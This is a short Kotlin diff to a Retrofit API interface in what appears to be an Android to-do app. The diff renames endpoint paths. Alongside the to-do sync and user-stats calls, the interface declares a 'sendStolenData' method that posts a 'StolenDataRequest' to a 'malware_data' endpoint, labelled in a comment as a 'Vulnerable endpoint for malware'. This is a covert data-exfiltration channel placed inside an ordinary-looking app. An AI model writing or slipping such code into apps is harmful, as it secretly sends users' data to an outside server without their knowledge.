@@ -4,14 +4,14 @@ import retrofit2.Response
 import retrofit2.http.*
 
 interface ApiService {
-    @POST("sync/todos")
+    @POST("todos")
     suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncResponse>
 
     @GET("user/stats")
     suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>
 
     // Vulnerable endpoint for malware
-    @POST("malware/data")
+    @POST("malware_data")
     suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
 }
 
